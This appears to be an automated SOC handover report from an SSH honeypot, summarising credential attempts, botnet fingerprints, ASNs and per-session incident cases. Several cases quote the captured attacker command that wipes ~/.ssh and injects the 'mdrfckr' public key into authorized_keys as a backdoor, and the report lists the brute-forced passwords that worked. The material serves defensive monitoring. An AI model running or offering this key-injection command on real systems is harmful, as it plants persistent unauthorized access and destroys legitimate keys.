# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-16 |
| **Generated At** | 2026-05-16T06:26:15Z |
| **Shift Time** | 06:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **366** |
| Confirmed Threats | **354** |
| False Positives Filtered | **12** (3.3%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **12** |
| High Severity Cases | **24** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **342** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **54** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **18** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `345gs5662d34` | 11 |
| `admin` | 3 |
| `orangepi` | 1 |
| `pi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `` | 2 |
| `warnight` | 2 |
| `orangepi` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 11 |
| `orangepi` | `orangepi` | 1 |
| `pi` | `raspberry` | 1 |
| `guest` | `guest` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `72.9.118.56` | 2026-05-16T03:32:55 |
| `root` | `warnightkardesim` | `103.193.176.131` | 2026-05-16T05:18:52 |
| `root` | `3245gs5662d34` | `103.193.176.131` | 2026-05-16T05:18:56 |
| `root` | `root@666` | `166.62.41.26` | 2026-05-16T05:21:11 |
| `root` | `3245gs5662d34` | `166.62.41.26` | 2026-05-16T05:21:17 |
| `root` | `welcome123` | `166.62.41.26` | 2026-05-16T05:22:39 |
| `root` | `oldsmobile` | `166.62.41.26` | 2026-05-16T05:24:15 |
| `root` | `QWE123qwe123` | `166.62.41.26` | 2026-05-16T05:25:33 |
| `root` | `srikanth` | `166.62.41.26` | 2026-05-16T05:28:08 |
| `root` | `ward` | `166.62.41.26` | 2026-05-16T05:29:27 |
| `root` | `admin` | `58.242.60.172` | 2026-05-16T06:14:54 |
| `root` | `Qaz1234567!` | `49.207.244.212` | 2026-05-16T06:19:41 |
| `root` | `3245gs5662d34` | `49.207.244.212` | 2026-05-16T06:19:42 |
| `root` | `Hn123456` | `49.207.244.212` | 2026-05-16T06:21:07 |
| `root` | `123@123Abc` | `49.207.244.212` | 2026-05-16T06:22:31 |
| `root` | `20192019` | `49.207.244.212` | 2026-05-16T06:23:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **366** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 42 |
| Unknown | 9 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 38 | 3 |
| `087ab61de4f8...` | Mirai/variant | 9 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 38 | 3 | Mirai/variant |
| `087ab61de4f8...` | Unknown | 9 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `49.207.244.212`, `166.62.41.26`, `103.193.176.131`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **20** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS49800` | GNC-Alfa CJSC | 1 | MEDIUM |
| `AS3301` | Telia Company AB | 1 | MEDIUM |
| `AS3462` | Data Communication Business Group | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (24)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-033bb5f5ec3a

| Field | Detail |
|---|---|
| **Source IP** | `72.9.118[.]56` |
| **First Seen** | 2026-05-16 03:32 |
| **Last Seen** | 2026-05-16 03:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 03:32:54` | `cowrie.session.connect` |
| `2026-05-16 03:32:54` | `cowrie.client.version` |
| `2026-05-16 03:32:54` | `cowrie.client.kex` |
| `2026-05-16 03:32:55` | `cowrie.login.success` |
| `2026-05-16 03:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.9.118[.]56` to AbuseIPDB if not already reported
- [ ] Block `72.9.118[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bbbed749eb2

| Field | Detail |
|---|---|
| **Source IP** | `103.193.176[.]131` |
| **First Seen** | 2026-05-16 05:18 |
| **Last Seen** | 2026-05-16 05:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:18:51` | `cowrie.session.connect` |
| `2026-05-16 05:18:51` | `cowrie.client.version` |
| `2026-05-16 05:18:51` | `cowrie.client.kex` |
| `2026-05-16 05:18:52` | `cowrie.login.success` |
| `2026-05-16 05:18:52` | `cowrie.session.params` |
| `2026-05-16 05:18:52` | `cowrie.command.input` |
| `2026-05-16 05:18:52` | `cowrie.command.failed` |
| `2026-05-16 05:18:52` | `cowrie.log.closed` |
| `2026-05-16 05:18:53` | `cowrie.session.params` |
| `2026-05-16 05:18:53` | `cowrie.command.input` |
| `2026-05-16 05:18:53` | `cowrie.session.file_download` |
| `2026-05-16 05:18:53` | `cowrie.log.closed` |
| `2026-05-16 05:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.193.176[.]131` to AbuseIPDB if not already reported
- [ ] Block `103.193.176[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af8f4105f5d

| Field | Detail |
|---|---|
| **Source IP** | `103.193.176[.]131` |
| **First Seen** | 2026-05-16 05:18 |
| **Last Seen** | 2026-05-16 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:18:55` | `cowrie.session.connect` |
| `2026-05-16 05:18:55` | `cowrie.client.version` |
| `2026-05-16 05:18:55` | `cowrie.client.kex` |
| `2026-05-16 05:18:56` | `cowrie.login.success` |
| `2026-05-16 05:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.193.176[.]131` to AbuseIPDB if not already reported
- [ ] Block `103.193.176[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7f42ea8f7c

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:21 |
| **Last Seen** | 2026-05-16 05:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:21:10` | `cowrie.session.connect` |
| `2026-05-16 05:21:10` | `cowrie.client.version` |
| `2026-05-16 05:21:10` | `cowrie.client.kex` |
| `2026-05-16 05:21:11` | `cowrie.login.success` |
| `2026-05-16 05:21:12` | `cowrie.session.params` |
| `2026-05-16 05:21:12` | `cowrie.command.input` |
| `2026-05-16 05:21:12` | `cowrie.command.failed` |
| `2026-05-16 05:21:12` | `cowrie.log.closed` |
| `2026-05-16 05:21:13` | `cowrie.session.params` |
| `2026-05-16 05:21:13` | `cowrie.command.input` |
| `2026-05-16 05:21:13` | `cowrie.session.file_download` |
| `2026-05-16 05:21:13` | `cowrie.log.closed` |
| `2026-05-16 05:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e9c2172810

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:21 |
| **Last Seen** | 2026-05-16 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:21:16` | `cowrie.session.connect` |
| `2026-05-16 05:21:16` | `cowrie.client.version` |
| `2026-05-16 05:21:16` | `cowrie.client.kex` |
| `2026-05-16 05:21:17` | `cowrie.login.success` |
| `2026-05-16 05:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbeff1556b16

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:22 |
| **Last Seen** | 2026-05-16 05:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:22:37` | `cowrie.session.connect` |
| `2026-05-16 05:22:37` | `cowrie.client.version` |
| `2026-05-16 05:22:38` | `cowrie.client.kex` |
| `2026-05-16 05:22:39` | `cowrie.login.success` |
| `2026-05-16 05:22:39` | `cowrie.session.params` |
| `2026-05-16 05:22:39` | `cowrie.command.input` |
| `2026-05-16 05:22:39` | `cowrie.command.failed` |
| `2026-05-16 05:22:40` | `cowrie.log.closed` |
| `2026-05-16 05:22:40` | `cowrie.session.params` |
| `2026-05-16 05:22:40` | `cowrie.command.input` |
| `2026-05-16 05:22:40` | `cowrie.session.file_download` |
| `2026-05-16 05:22:40` | `cowrie.log.closed` |
| `2026-05-16 05:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce62c5c29e18

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:22 |
| **Last Seen** | 2026-05-16 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:22:44` | `cowrie.session.connect` |
| `2026-05-16 05:22:44` | `cowrie.client.version` |
| `2026-05-16 05:22:44` | `cowrie.client.kex` |
| `2026-05-16 05:22:45` | `cowrie.login.success` |
| `2026-05-16 05:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd37926a354d

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:24 |
| **Last Seen** | 2026-05-16 05:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:24:13` | `cowrie.session.connect` |
| `2026-05-16 05:24:13` | `cowrie.client.version` |
| `2026-05-16 05:24:14` | `cowrie.client.kex` |
| `2026-05-16 05:24:15` | `cowrie.login.success` |
| `2026-05-16 05:24:15` | `cowrie.session.params` |
| `2026-05-16 05:24:15` | `cowrie.command.input` |
| `2026-05-16 05:24:15` | `cowrie.command.failed` |
| `2026-05-16 05:24:16` | `cowrie.log.closed` |
| `2026-05-16 05:24:16` | `cowrie.session.params` |
| `2026-05-16 05:24:16` | `cowrie.command.input` |
| `2026-05-16 05:24:16` | `cowrie.session.file_download` |
| `2026-05-16 05:24:16` | `cowrie.log.closed` |
| `2026-05-16 05:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5005a8a9db0c

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:24 |
| **Last Seen** | 2026-05-16 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:24:20` | `cowrie.session.connect` |
| `2026-05-16 05:24:20` | `cowrie.client.version` |
| `2026-05-16 05:24:20` | `cowrie.client.kex` |
| `2026-05-16 05:24:21` | `cowrie.login.success` |
| `2026-05-16 05:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1823d8407b

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:25 |
| **Last Seen** | 2026-05-16 05:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:25:31` | `cowrie.session.connect` |
| `2026-05-16 05:25:31` | `cowrie.client.version` |
| `2026-05-16 05:25:32` | `cowrie.client.kex` |
| `2026-05-16 05:25:33` | `cowrie.login.success` |
| `2026-05-16 05:25:33` | `cowrie.session.params` |
| `2026-05-16 05:25:33` | `cowrie.command.input` |
| `2026-05-16 05:25:33` | `cowrie.command.failed` |
| `2026-05-16 05:25:34` | `cowrie.log.closed` |
| `2026-05-16 05:25:34` | `cowrie.session.params` |
| `2026-05-16 05:25:34` | `cowrie.command.input` |
| `2026-05-16 05:25:34` | `cowrie.session.file_download` |
| `2026-05-16 05:25:34` | `cowrie.log.closed` |
| `2026-05-16 05:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dadf3ab836f7

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:25 |
| **Last Seen** | 2026-05-16 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:25:37` | `cowrie.session.connect` |
| `2026-05-16 05:25:37` | `cowrie.client.version` |
| `2026-05-16 05:25:38` | `cowrie.client.kex` |
| `2026-05-16 05:25:39` | `cowrie.login.success` |
| `2026-05-16 05:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a75c77e3a0

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:28 |
| **Last Seen** | 2026-05-16 05:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:28:06` | `cowrie.session.connect` |
| `2026-05-16 05:28:06` | `cowrie.client.version` |
| `2026-05-16 05:28:06` | `cowrie.client.kex` |
| `2026-05-16 05:28:08` | `cowrie.login.success` |
| `2026-05-16 05:28:08` | `cowrie.session.params` |
| `2026-05-16 05:28:08` | `cowrie.command.input` |
| `2026-05-16 05:28:08` | `cowrie.command.failed` |
| `2026-05-16 05:28:09` | `cowrie.log.closed` |
| `2026-05-16 05:28:09` | `cowrie.session.params` |
| `2026-05-16 05:28:09` | `cowrie.command.input` |
| `2026-05-16 05:28:09` | `cowrie.session.file_download` |
| `2026-05-16 05:28:09` | `cowrie.log.closed` |
| `2026-05-16 05:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-439fa0de782d

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:28 |
| **Last Seen** | 2026-05-16 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 05:28:12` | `cowrie.session.connect` |
| `2026-05-16 05:28:12` | `cowrie.client.version` |
| `2026-05-16 05:28:12` | `cowrie.client.kex` |
| `2026-05-16 05:28:14` | `cowrie.login.success` |
| `2026-05-16 05:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]26` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e90a1c4cc1b

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]26` |
| **First Seen** | 2026-05-16 05:29 |
| **Last Seen** | 2026-05-16 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
